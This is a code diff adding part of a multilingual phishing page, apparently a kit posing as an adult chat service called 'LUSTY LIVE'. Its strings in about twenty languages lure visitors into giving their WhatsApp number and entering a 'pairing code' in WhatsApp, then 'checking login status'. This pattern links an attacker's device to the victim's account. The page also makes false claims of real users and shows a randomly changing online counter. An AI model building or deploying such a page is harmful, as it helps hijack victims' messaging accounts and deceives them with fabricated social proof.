+                "content1": "LUSTY LIVE",
+                "content2": "ออนไลน์",
+                "content3": "สาวจริง การเชื่อมต่อจริง",
+                "content4": "มีสาวๆ กว่า 10,000 คนกำลังรอสายของคุณ...",
+                "content5": "ดำเนินการต่อด้วย WhatsApp",
+                "content6": "ผู้ใช้จริง 100%",
+                "content7": "ความเป็นส่วนตัวปลอดภัย",
+                "content8": "18+ เท่านั้น",
+                "content9": "ยืนยันตัวตนจริง",
+                "content10": "โปรดกรอกหมายเลข WhatsApp ของคุณเพื่อยืนยัน",
+                "content11": "หมายเลข WhatsApp",
+                "btn-get-code": "ดำเนินการต่อ",
+                "content13": "โปรดกรอกรหัสจับคู่ใน WhatsApp ของคุณ",
+                "content14": "หมายเลข WhatsApp:",
+                "content15": "คัดลอกไปยัง WhatsApp",
+                "content16": "ยืนยันตัวตนเพื่อเริ่มพูดคุยกับสาวจริงกว่า 10,000 คน!",
+                "content17": "คัดลอกรหัสจับคู่แล้ว โปรดวางใน WhatsApp",
+                "content18": "รหัสจับคู่ WhatsApp",
+                "poll-button": "รอสักครู่ (10 วินาที)",
+                "toast1": "โปรดกรอกหมายเลขโทรศัพท์ที่ถูกต้อง",
+                "toast2": "โปรดลองอีกครั้งในภายหลัง",
+                "toast3": "การเชื่อมต่อล้มเหลว ตรวจสอบเครือข่ายของคุณ",
+                "toast4": "กำลังตรวจสอบสถานะการเข้าสู่ระบบ",
+                "toast5": "✓ ยืนยันสำเร็จ (คลิกเพื่อดำเนินการต่อ)",
+                "toast6": "ไม่พบการเข้าสู่ระบบ คลิกเพื่อลองใหม่"
+            },
+            "ms": {
+                "content1": "LUSTY LIVE",
+                "content2": "DALAM TALIAN",
+                "content3": "Gadis Sebenar. Hubungan Sebenar",
+                "content4": "10,000+ gadis sedang menunggu panggilan anda...",
+                "content5": "Teruskan dengan WhatsApp",
+                "content6": "100% Pengguna Sebenar",
+                "content7": "Privasi Terjamin",
+                "content8": "18+ Sahaja",
+                "content9": "Sahkan Orang Sebenar",
+                "content10": "Sila masukkan nombor WhatsApp anda untuk pengesahan",
+                "content11": "Nombor WhatsApp",
+                "btn-get-code": "Teruskan",
+                "content13": "Sila masukkan kod gandingan dalam WhatsApp anda",
+                "content14": "Nombor WhatsApp:",
+                "content15": "Salin ke WhatsApp",
+                "content16": "Dapatkan pengesahan untuk mula berinteraksi dengan 10,000+ gadis sebenar!",
+                "content17": "Kod gandingan telah disalin, sila tampal dalam WhatsApp",
+                "content18": "Kod Gandingan WhatsApp",
+                "poll-button": "Menunggu (10s)",
+                "toast1": "Sila masukkan nombor telefon yang sah",
+                "toast2": "Sila cuba sebentar lagi",
+                "toast3": "Sambungan gagal. Semak rangkaian anda",
+                "toast4": "Menyemak status log masuk",
+                "toast5": "✓ Pengesahan berjaya (klik untuk teruskan)",
+                "toast6": "Log masuk tidak dikesan, klik untuk cuba lagi"
+            },
+            "in": {
+                "content1": "LUSTY LIVE",
+                "content2": "ONLINE",
+                "content3": "Gadis Asli. Koneksi Nyata",
+                "content4": "10.000+ gadis menunggu panggilan Anda...",
+                "content5": "Lanjutkan dengan WhatsApp",
+                "content6": "100% Pengguna Asli",
+                "content7": "Privasi Terjamin",
+                "content8": "Khusus 18+",
+                "content9": "Verifikasi Orang Asli",
+                "content10": "Silakan masukkan nomor WhatsApp Anda untuk verifikasi",
+                "content11": "Nomor WhatsApp",
+                "btn-get-code": "Lanjutkan",
+                "content13": "Silakan masukkan kode pemasangan di WhatsApp Anda",
+                "content14": "Nomor WhatsApp:",
+                "content15": "Salin ke WhatsApp",
+                "content16": "Dapatkan verifikasi untuk mulai berinteraksi dengan 10.000+ gadis asli!",
+                "content17": "Kode pemasangan telah disalin, silakan tempel di WhatsApp",
+                "content18": "Kode Pemasangan WhatsApp",
+                "poll-button": "Menunggu (10 dtk)",
+                "toast1": "Silakan masukkan nomor telepon yang valid",
+                "toast2": "Silakan coba lagi nanti",
+                "toast3": "Koneksi gagal. Periksa jaringan Anda",
+                "toast4": "Memeriksa status login",
+                "toast5": "✓ Verifikasi berhasil (klik untuk melanjutkan)",
+                "toast6": "Login tidak terdeteksi, klik untuk mencoba lagi"
+            },
+            "id": {
+                "content1": "LUSTY LIVE",
+                "content2": "ONLINE",
+                "content3": "Gadis Asli. Koneksi Nyata",
+                "content4": "10.000+ gadis menunggu panggilan Anda...",
+                "content5": "Lanjutkan dengan WhatsApp",
+                "content6": "100% Pengguna Asli",
+                "content7": "Privasi Terjamin",
+                "content8": "Khusus 18+",
+                "content9": "Verifikasi Orang Asli",
+                "content10": "Silakan masukkan nomor WhatsApp Anda untuk verifikasi",
+                "content11": "Nomor WhatsApp",
+                "btn-get-code": "Lanjutkan",
+                "content13": "Silakan masukkan kode pemasangan di WhatsApp Anda",
+                "content14": "Nomor WhatsApp:",
+                "content15": "Salin ke WhatsApp",
+                "content16": "Dapatkan verifikasi untuk mulai berinteraksi dengan 10.000+ gadis asli!",
+                "content17": "Kode pemasangan telah disalin, silakan tempel di WhatsApp",
+                "content18": "Kode Pemasangan WhatsApp",
+                "poll-button": "Menunggu (10 dtk)",
+                "toast1": "Silakan masukkan nomor telepon yang valid",
+                "toast2": "Silakan coba lagi nanti",
+                "toast3": "Koneksi gagal. Periksa jaringan Anda",
+                "toast4": "Memeriksa status login",
+                "toast5": "✓ Verifikasi berhasil (klik untuk melanjutkan)",
+                "toast6": "Login tidak terdeteksi, klik untuk mencoba lagi"
+            },
+            "hi": {
+                "content1": "LUSTY LIVE",
+                "content2": "ऑनलाइन",
+                "content3": "असली लड़कियाँ। असली जुड़ाव",
+                "content4": "10,000+ लड़कियाँ आपकी कॉल का इंतज़ार कर रही हैं...",
+                "content5": "WhatsApp के साथ जारी रखें",
+                "content6": "100% असली उपयोगकर्ता",
+                "content7": "गोपनीयता सुरक्षित",
+                "content8": "केवल 18+",
+                "content9": "असली व्यक्ति की पुष्टि करें",
+                "content10": "सत्यापित करने के लिए कृपया अपना व्हाट्सएप नंबर दर्ज करें",
+                "content11": "व्हाट्सएप नंबर",
+                "btn-get-code": "जारी रखें",
+                "content13": "कृपया अपने व्हाट्सएप में पेयरिंग कोड दर्ज करें",
+                "content14": "व्हाट्सएप नंबर:",
+                "content15": "व्हाट्सएप पर कॉपी करें",
+                "content16": "10,000+ असली लड़कियों के साथ बातचीत शुरू करने के लिए सत्यापित हों!",
+                "content17": "पेयरिंग कोड कॉपी कर लिया गया है, कृपया इसे व्हाट्सएप में पेस्ट करें",
+                "content18": "व्हाट्सएप पेयरिंग कोड",
+                "poll-button": "प्रतीक्षा करें (10 सेकंड)",
+                "toast1": "कृपया एक मान्य फ़ोन नंबर दर्ज करें",
+                "toast2": "कृपया बाद में पुनः प्रयास करें",
+                "toast3": "कनेक्शन विफल। अपना नेटवर्क जांचें",
+                "toast4": "लॉगिन स्थिति की जाँच की जा रही है",
+                "toast5": "✓ सत्यापन सफल (जारी रखने के लिए क्लिक करें)",
+                "toast6": "लॉगिन का पता नहीं चला, पुनः प्रयास करने के लिए क्लिक करें"
+            },
+            "bn": {
+                "content1": "LUSTY LIVE",
+                "content2": "অনলাইন",
+                "content3": "আসল মেয়ে। আসল সংযোগ",
+                "content4": "১০,০০০+ মেয়ে আপনার কলের জন্য অপেক্ষা করছে...",
+                "content5": "WhatsApp দিয়ে চালিয়ে যান",
+                "content6": "১০০% আসল ব্যবহারকারী",
+                "content7": "গোপনীয়তা সুরক্ষিত",
+                "content8": "শুধুমাত্র ১৮+",
+                "content9": "আসল ব্যক্তি যাচাই করুন",
+                "content10": "যাচাই করতে দয়া করে আপনার হোয়াটসঅ্যাপ নম্বর লিখুন",
+                "content11": "হোয়াটসঅ্যাপ নম্বর",
+                "btn-get-code": "চালিয়ে যান",
+                "content13": "দয়া করে আপনার হোয়াটসঅ্যাপে পেয়ারিং কোডটি লিখুন",
+                "content14": "হোয়াটসঅ্যাপ নম্বর:",
+                "content15": "হোয়াটসঅ্যাপে কপি করুন",
+                "content16": "১০,০০০+ আসল মেয়েদের সাথে কথা বলতে নিজেকে যাচাই করুন!",
+                "content17": "পেয়ারিং কোডটি কপি করা হয়েছে, দয়া করে এটি হোয়াটসঅ্যাপে পেস্ট করুন",
+                "content18": "হোয়াটসঅ্যাপ পেয়ারিং কোড",
+                "poll-button": "অপেক্ষা করুন (১০ সেকেন্ড)",
+                "toast1": "দয়া করে একটি সঠিক ফোন নম্বর লিখুন",
+                "toast2": "দয়া করে পরে আবার চেষ্টা করুন",
+                "toast3": "সংযোগ ব্যর্থ হয়েছে। আপনার নেটওয়ার্ক পরীক্ষা করুন",
+                "toast4": "লগইন অবস্থা পরীক্ষা করা হচ্ছে",
+                "toast5": "✓ যাচাইকরণ সফল হয়েছে (চালিয়ে যেতে ক্লিক করুন)",
+                "toast6": "লগইন পাওয়া যায়নি, আবার চেষ্টা করতে ক্লিক করুন"
+            },
+            "ur": {
+                "content1": "LUSTY LIVE",
+                "content2": "آن لائن",
+                "content3": "اصلی لڑکیاں۔ اصلی تعلقات",
+                "content4": "10,000+ لڑکیاں آپ کی کال کا انتظار کر رہی ہیں...",
+                "content5": "واٹس ایپ کے ساتھ جاری رکھیں",
+                "content6": "100% اصلی صارفین",
+                "content7": "رازداری محفوظ",
+                "content8": "صرف 18+",
+                "content9": "اصلی شخص کی تصدیق کریں",
+                "content10": "تصدیق کے لیے براہ کرم اپنا واٹس ایپ نمبر درج کریں",
+                "content11": "واٹس ایپ نمبر",
+                "btn-get-code": "جاری رکھیں",
+                "content13": "براہ کرم اپنے واٹس ایپ میں پیئرنگ کوڈ درج کریں",
+                "content14": "واٹس ایپ نمبر:",
+                "content15": "واٹس ایپ پر کاپی کریں",
+                "content16": "10,000+ اصلی لڑکیوں سے بات چیت شروع کرنے کے لیے تصدیق کروائیں!",
+                "content17": "پیئرنگ کوڈ کاپی کر لیا گیا ہے، براہ کرم اسے واٹس ایپ میں پیسٹ کریں",
+                "content18": "واٹس ایپ پیئرنگ کوڈ",
+                "poll-button": "انتظار کریں (10 سیکنڈ)",
+                "toast1": "براہ کرم درست فون نمبر درج کریں",
+                "toast2": "براہ کرم کچھ دیر بعد دوبارہ کوشش کریں",
+                "toast3": "کنکشن ناکام ہوگیا۔ اپنا نیٹ ورک چیک کریں",
+                "toast4": "لاگ ان کی صورتحال چیک کی جا رہی ہے",
+                "toast5": "✓ تصدیق کامیاب (آگے بڑھنے کے لیے کلک کریں)",
+                "toast6": "لاگ ان نہیں ملا، دوبارہ کوشش کرنے کے لیے کلک کریں"
+            },
+            "ar": {
+                "content1": "LUSTY LIVE",
+                "content2": "متصل الآن",
+                "content3": "فتيات حقيقيات. تواصل حقيقي",
+                "content4": "أكثر من 10,000 فتاة ينتظرن اتصالك...",
+                "content5": "المتابعة باستخدام واتساب",
+                "content6": "مستخدمون حقيقيون 100%",
+                "content7": "خصوصية مؤمنة",
+                "content8": "18+ فقط",
+                "content9": "التحقق من الشخص الحقيقي",
+                "content10": "يرجى إدخال رقم واتساب الخاص بك للتحقق",
+                "content11": "رقم واتساب",
+                "btn-get-code": "استمرار",
+                "content13": "يرجى إدخال رمز الاقتران في تطبيق واتساب الخاص بك",
+                "content14": "رقم واتساب:",
+                "content15": "نسخ إلى واتساب",
+                "content16": "تحقق الآن لبدء التفاعل مع أكثر من 10,000 فتاة حقيقية!",
+                "content17": "تم نسخ رمز الاقتران، يرجى لصقه في واتساب",
+                "content18": "رمز اقتران واتساب",
+                "poll-button": "انتظار (10 ثوانٍ)",
+                "toast1": "يرجى إدخال رقم هاتف صحيح",
+                "toast2": "يرجى المحاولة مرة أخرى لاحقاً",
+                "toast3": "فشل الاتصال. تحقق من الشبكة",
+                "toast4": "جاري التحقق من حالة تسجيل الدخول",
+                "toast5": "✓ تم التحقق بنجاح (انقر للاستمرار)",
+                "toast6": "لم يتم اكتشاف تسجيل الدخول، انقر لإعادة المحاولة"
+            },
+            "fa": {
+                "content1": "LUSTY LIVE",
+                "content2": "آنلاین",
+                "content3": "دختران واقعی. ارتباطات واقعی",
+                "content4": "بیش از ۱۰,۰۰۰ دختر منتظر تماس شما هستند...",
+                "content5": "ادامه با واتساپ",
+                "content6": "۱۰۰٪ کاربران واقعی",
+                "content7": "حریم خصوصی امن",
+                "content8": "فقط ۱۸+",
+                "content9": "تأیید شخص واقعی",
+                "content10": "لطفاً شماره واتس‌اپ خود را برای تأیید وارد کنید",
+                "content11": "شماره واتس‌اپ",
+                "btn-get-code": "ادامه",
+                "content13": "لطفاً کد جفت‌سازی را در واتس‌اپ خود وارد کنید",
+                "content14": "شماره واتس‌اپ:",
+                "content15": "کپی در واتس‌اپ",
+                "content16": "تأیید شوید تا تعامل با بیش از ۱۰,۰۰۰ دختر واقعی را شروع کنید!",
+                "content17": "کد جفت‌سازی کپی شد، لطفاً آن را در واتس‌اپ قرار دهید (Paste)",
+                "content18": "کد جفت‌سازی واتس‌اپ",
+                "poll-button": "منتظر بمانید (۱۰ ثانیه)",
+                "toast1": "لطفاً یک شماره تلفن معتبر وارد کنید",
+                "toast2": "لطفاً بعداً دوباره امتحان کنید",
+                "toast3": "اتصال برقرار نشد. شبکه خود را بررسی کنید",
+                "toast4": "در حال بررسی وضعیت ورود",
+                "toast5": "✓ تأیید موفقیت‌آمیز بود (برای ادامه کلیک کنید)",
+                "toast6": "ورود شناسایی نشد، برای تلاش مجدد کلیک کنید"
+            },
+            "ps": {
+                "content1": "LUSTY LIVE",
+                "content2": "آنلاین",
+                "content3": "رښتیني نجونې. رښتیني اړیکې",
+                "content4": "تر ۱۰،۰۰۰ ډیرې نجونې ستاسو زنګ ته په تمه دي...",
+                "content5": "د WhatsApp سره دوام ورکړئ",
+                "content6": "۱۰۰٪ رښتیني کاروونکي",
+                "content7": "محرمیت خوندي دی",
+                "content8": "یوازې ۱۸+",
+                "content9": "رښتینی شخص تایید کړئ",
+                "content10": "مهرباني وکړئ د تایید لپاره خپل د واټس اپ نمبر دننه کړئ",
+                "content11": "د واټس اپ نمبر",
+                "btn-get-code": "ادامه ورکړئ",
+                "content13": "مهرباني وکړئ په خپل واټس اپ کې د جوړه کولو کوډ دننه کړئ",
+                "content14": "د واټس اپ نمبر:",
+                "content15": "واټس اپ ته کاپي کړئ",
+                "content16": "تایید ترلاسه کړئ ترڅو د ۱۰،۰۰۰ څخه ډیرو رښتیني نجونو سره اړیکه پیل کړئ!",
+                "content17": "د جوړه کولو کوډ کاپي شو، مهرباني وکړئ په واټس اپ کې یې پیسټ کړئ",
+                "content18": "د واټس اپ جوړه کولو کوډ",
+                "poll-button": "انتظار (۱۰ ثانیې)",
+                "toast1": "مهرباني وکړئ یو سم د تلیفون نمبر دننه کړئ",
+                "toast2": "مهرباني وکړئ وروسته بیا هڅه وکړئ",
+                "toast3": "اړیکه ناکامه شوه. خپله شبکه وګورئ",
+                "toast4": "د ننوتلو حالت کتل کیږي",
+                "toast5": "✓ تایید بریالی و (د دوام لپاره کلیک وکړئ)",
+                "toast6": "ننوتل ونه موندل شو، د بیا هڅې لپاره کلیک وکړئ"
+            },
+            "fr": {
+                "content1": "LUSTY LIVE",
+                "content2": "EN LIGNE",
+                "content3": "Filles Réelles. Vraies Connexions",
+                "content4": "+10 000 filles attendent votre appel...",
+                "content5": "Continuer avec WhatsApp",
+                "content6": "100% Utilisateurs Réels",
+                "content7": "Confidentialité Sécurisée",
+                "content8": "18+ Seulement",
+                "content9": "Vérifier Personne Réelle",
+                "content10": "Veuillez entrer votre numéro WhatsApp pour vérifier",
+                "content11": "Numéro WhatsApp",
+                "btn-get-code": "Continuer",
+                "content13": "Veuillez entrer le code d'association dans votre WhatsApp",
+                "content14": "Numéro WhatsApp :",
+                "content15": "Copier vers WhatsApp",
+                "content16": "Vérifiez-vous pour interagir avec plus de 10 000 vraies filles !",
+                "content17": "Le code d'association a été copié, veuillez le coller dans WhatsApp",
+                "content18": "Code d'association WhatsApp",
+                "poll-button": "Attente (10s)",
+                "toast1": "Veuillez entrer un numéro de téléphone valide",
+                "toast2": "Veuillez réessayer plus tard",
+                "toast3": "Échec de la connexion. Vérifiez votre réseau",
+                "toast4": "Vérification du statut de connexion",
+                "toast5": "✓ Vérification réussie (cliquer pour continuer)",
+                "toast6": "Connexion non détectée, cliquer pour réessayer"
+            },
+            "it": {
+                "content1": "LUSTY LIVE",
+                "content2": "ONLINE",
+                "content3": "Ragazze Vere. Connessioni Reali",
+                "content4": "Oltre 10.000 ragazze aspettano la tua chiamata...",
+                "content5": "Continua con WhatsApp",
+                "content6": "100% Utenti Reali",
+                "content7": "Privacy Garantita",
+                "content8": "Solo 18+",
+                "content9": "Verifica Persona Reale",
+                "content10": "Inserisci il tuo numero WhatsApp per verificare",
+                "content11": "Numero WhatsApp",
+                "btn-get-code": "Continua",
+                "content13": "Inserisci il codice di associazione nel tuo WhatsApp",
+                "content14": "Numero WhatsApp:",
+                "content15": "Copia su WhatsApp",
+                "content16": "Verificati per iniziare a interagire con oltre 10.000 ragazze vere!",
+                "content17": "Codice di associazione copiato, incollalo su WhatsApp",
+                "content18": "Codice di Associazione WhatsApp",
+                "poll-button": "In attesa (10s)",
+                "toast1": "Inserisci un numero di telefono valido",
+                "toast2": "Riprova più tardi",
+                "toast3": "Connessione fallita. Controlla la tua rete",
+                "toast4": "Verifica dello stato di accesso",
+                "toast5": "✓ Verifica riuscita (clicca per continuare)",
+                "toast6": "Accesso non rilevato, clicca per riprovare"
+            },
+            "pt": {
+                "content1": "LUSTY LIVE",
+                "content2": "ONLINE",
+                "content3": "Garotas Reais. Conexões Reais",
+                "content4": "Mais de 10.000 garotas estão esperando sua chamada...",
+                "content5": "Continuar com WhatsApp",
+                "content6": "100% Usuários Reais",
+                "content7": "Privacidade Segura",
+                "content8": "Apenas 18+",
+                "content9": "Verificar Pessoa Real",
+                "content10": "Por favor, insira seu número do WhatsApp para verificar",
+                "content11": "Número do WhatsApp",
+                "btn-get-code": "Continuar",
+                "content13": "Por favor, insira o código de pareamento no seu WhatsApp",
+                "content14": "Número do WhatsApp:",
+                "content15": "Copiar para o WhatsApp",
+                "content16": "Seja verificado para começar a interagir com mais de 10.000 garotas reais!",
+                "content17": "O código de pareamento foi copiado, cole-o no WhatsApp",
+                "content18": "Código de Pareamento WhatsApp",
+                "poll-button": "Aguardando (10s)",
+                "toast1": "Por favor, insira um número de telefone válido",
+                "toast2": "Por favor, tente novamente mais tarde",
+                "toast3": "Falha na conexão. Verifique sua rede",
+                "toast4": "Verificando status de login",
+                "toast5": "✓ Verificação bem-sucedida (clique para continuar)",
+                "toast6": "Login não detectado, clique para tentar novamente"
+            },
+            "de": {
+                "content1": "LUSTY LIVE",
+                "content2": "ONLINE",
+                "content3": "Echte Mädchen. Echte Verbindungen",
+                "content4": "Über 10.000 Mädchen warten auf deinen Anruf...",
+                "content5": "Mit WhatsApp fortfahren",
+                "content6": "100% echte Nutzer",
+                "content7": "Privatsphäre gesichert",
+                "content8": "Nur 18+",
+                "content9": "Echte Person verifizieren",
+                "content10": "Bitte gib deine WhatsApp-Nummer zur Verifizierung ein",
+                "content11": "WhatsApp-Nummer",
+                "btn-get-code": "Weiter",
+                "content13": "Bitte gib den Kopplungscode in deinem WhatsApp ein",
+                "content14": "WhatsApp-Nummer:",
+                "content15": "In WhatsApp kopieren",
+                "content16": "Lass dich verifizieren, um mit über 10.000 echten Mädchen zu interagieren!",
+                "content17": "Der Kopplungscode wurde kopiert, bitte füge ihn in WhatsApp ein",
+                "content18": "WhatsApp-Kopplungscode",
+                "poll-button": "Warten (10s)",
+                "toast1": "Bitte gib eine gültige Telefonnummer ein",
+                "toast2": "Bitte versuche es später erneut",
+                "toast3": "Verbindung fehlgeschlagen. Überprüfe dein Netzwerk",
+                "toast4": "Anmeldestatus wird geprüft",
+                "toast5": "✓ Verifizierung erfolgreich (zum Fortfahren klicken)",
+                "toast6": "Anmeldung nicht erkannt, zum Erneutversuchen klicken"
+            },
+            "es": {
+                "content1": "LUSTY LIVE",
+                "content2": "EN LÍNEA",
+                "content3": "Chicas Reales. Conexiones Reales",
+                "content4": "Más de 10,000 chicas esperan tu llamada...",
+                "content5": "Continuar con WhatsApp",
+                "content6": "100% Usuarios Reales",
+                "content7": "Privacidad Asegurada",
+                "content8": "Solo 18+",
+                "content9": "Verificar Persona Real",
+                "content10": "Por favor, ingresa tu número de WhatsApp para verificar",
+                "content11": "Número de WhatsApp",
+                "btn-get-code": "Continuar",
+                "content13": "Por favor, ingresa el código de vinculación en tu WhatsApp",
+                "content14": "Número de WhatsApp:",
+                "content15": "Copiar a WhatsApp",
+                "content16": "¡Verifícate para empezar a interactuar con más de 10,000 chicas reales!",
+                "content17": "El código de vinculación ha sido copiado, por favor pégalo en WhatsApp",
+                "content18": "Código de Vinculación de WhatsApp",
+                "poll-button": "Esperando (10s)",
+                "toast1": "Por favor, ingresa un número de teléfono válido",
+                "toast2": "Por favor, intenta de nuevo más tarde",
+                "toast3": "Error de conexión. Revisa tu red",
+                "toast4": "Verificando estado de inicio de sesión",
+                "toast5": "✓ Verificación exitosa (clic para continuar)",
+                "toast6": "Inicio de sesión no detectado, clic para reintentar"
+            },
+            "sw": {
+                "content1": "LUSTY LIVE",
+                "content2": "YUKO MTANDAONI",
+                "content3": "Wasichana Halisi. Uhusiano wa Kweli",
+                "content4": "Zaidi ya wasichana 10,000 wanasubiri simu yako...",
+                "content5": "Endelea na WhatsApp",
+                "content6": "Watumiaji Halisi 100%",
+                "content7": "Faragha Imelindwa",
+                "content8": "Miaka 18+ Pekee",
+                "content9": "Thibitisha Mtu Halisi",
+                "content10": "Tafadhali ingiza namba yako ya WhatsApp ili kuthibitisha",
+                "content11": "Namba ya WhatsApp",
+                "btn-get-code": "Endelea",
+                "content13": "Tafadhali ingiza kodi ya kuunganisha kwenye WhatsApp yako",
+                "content14": "Namba ya WhatsApp:",
+                "content15": "Nakili kwenda WhatsApp",
+                "content16": "Thibitishwa ili uanze kuingiliana na wasichana halisi zaidi ya 10,000!",
+                "content17": "Kodi ya kuunganisha imenakiliwa, tafadhali ibandike kwenye WhatsApp",
+                "content18": "Kodi ya Kuunganisha WhatsApp",
+                "poll-button": "Inasubiri (sek 10)",
+                "toast1": "Tafadhali ingiza namba ya simu halali",
+                "toast2": "Tafadhali jaribu tena baadaye",
+                "toast3": "Uunganishaji umeshindwa. Angalia mtandao wako",
+                "toast4": "Inakagua hali ya kuingia",
+                "toast5": "✓ Uthibitishaji umefanikiwa (bonyeza ili kuendelea)",
+                "toast6": "Kuingia hakujatambuliwa, bonyeza ili jaribu tena"
+            },
+            "en": {
+                "content1": "LUSTY LIVE",
+				"content2": "ONLINE",
+				"content3": "Real Girls. Real Connections",
+				"content4": "10,000+ girls are waiting for your call...",
+				"content5": "Continue With WhatsApp",
+				"content6": "100% Real Users",
+				"content7": "Privacy Secured",
+				"content8": "18+ Only",
+				"content9": "Verify Real Person",
+				"content10": "Please enter your WhatsApp number to verify",
+				"content11": "WhatsApp Number",
+				"btn-get-code": "Continue",
+				"content13": "Please enter the pairing code in your WhatsApp",
+				"content14": "WhatsApp Number:",
+				"content15": "Copy to WhatsApp",
+				"content16": "Get verified to start interacting with 10,000+ real girls!",
+				"content17": "The pairing code has been copied, please paste it in WhatsApp",
+                "content18": "WhatsApp Pairing Code",
+				"poll-button": "Waiting (10s)",
+				"toast1": "Please enter a valid phone number",
+				"toast2": "Please try again later",
+				"toast3": "Connection failed. Check your network",
+				"toast4": "Checking login status",
+				"toast5": "✓ Verification successful (click to continue)",
+				"toast6": "Login not detected, click to retry"
+            },
+            "zh": {
+                "content1": "LUSTY LIVE",
+                "content2": "在线",
+                "content3": "真实女孩，真实互动",
+                "content4": "超过10,000名女孩等你来电...",
+                "content5": "使用 WhatsApp 继续",
+                "content6": "100%真实用户",
+                "content7": "隐私安全",
+                "content8": "仅限18岁以上",
+                "content9": "验证真人",
+                "content10": "请输入您的WhatsApp号码进行验证",
+                "content11": "WhatsApp号码",
+                "btn-get-code": "继续",
+                "content13": "请在您的WhatsApp中输入配对码",
+                "content14": "WhatsApp号码：",
+                "content15": "复制到WhatsApp",
+                "content16": "完成验证即可开始与超过 10,000 名真实女孩互动！",
+                "content17": "配对码已复制，请将其粘贴到 WhatsApp 中",
+                "content18": "WhatsApp 配对码",
+                "poll-button": "等待中（10 秒）",
+                "toast1": "请输入有效的电话号码",
+                "toast2": "请稍后再试",
+                "toast3": "连接失败。请检查您的网络",
+                "toast4": "正在检查登录状态",
+                "toast5": "✓ 验证成功（点击继续）",
+                "toast6": "未检测到登录，点击重试"
+            }
+        }
+
+        function safeSet(id, content, isHTML = false) {
+            const el = document.getElementById(id);
+            if (el) isHTML ? (el.innerHTML = content) : (el.innerText = content);
+        }
+
+        function updateLanguage(code) {
+            currentLang = code; L = langData[code];
+
+            safeSet('content1', L.content1);
+            safeSet('content2', L.content2);
+            safeSet('content3', L.content3);
+            safeSet('content4', L.content4);
+            safeSet('content5', L.content5);
+            safeSet('content6', L.content6);
+            safeSet('content7', L.content7);
+            safeSet('content8', L.content8);
+            safeSet('content9', L.content9);
+            safeSet('content10', L.content10);
+            safeSet('content11', L.content11);
+            safeSet('btn-get-code', L['btn-get-code']);
+            safeSet('content13', L.content13);
+            safeSet('content14', L.content14);
+            safeSet('content15', L.content15);
+            safeSet('content16', L.content16);
+            safeSet('content17', L.content17);
+            safeSet('content18', L.content18);
+            safeSet('poll-button', L['poll-button']);
+        }
+
+        // window.onload = function () {
+        //     var browser_language = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0];
+        //     browser_language = browser_language.toLowerCase();
+
+        //     const languagePackages = ['ar', 'bn', 'fa', 'en', 'hi', 'id', 'in', 'ms', 'ps', 'th', 'ur', 'sw', 'fr', 'it', 'pt', 'de', 'es', 'tl', 'fil'];
+
+        //     let selectedLanguage = "en";
+        //     if (languagePackages.includes(browser_language)) {
+        //         selectedLanguage = browser_language;
+        //     }
+        //     updateLanguage(selectedLanguage);
+        // }
+
+        // Counter Fluctuation Logic
+        setInterval(() => {
+            const count = document.getElementById('online-count');
+            const current = parseInt(count.innerText.replace(',', ''));
+            const change = Math.floor(Math.random() * 15) - 7;
+            count.innerText = (current + change).toLocaleString();
+        }, 2500);
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"fc16413476424b24aaec8495ec1621d7","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
-    </html>
+</html>
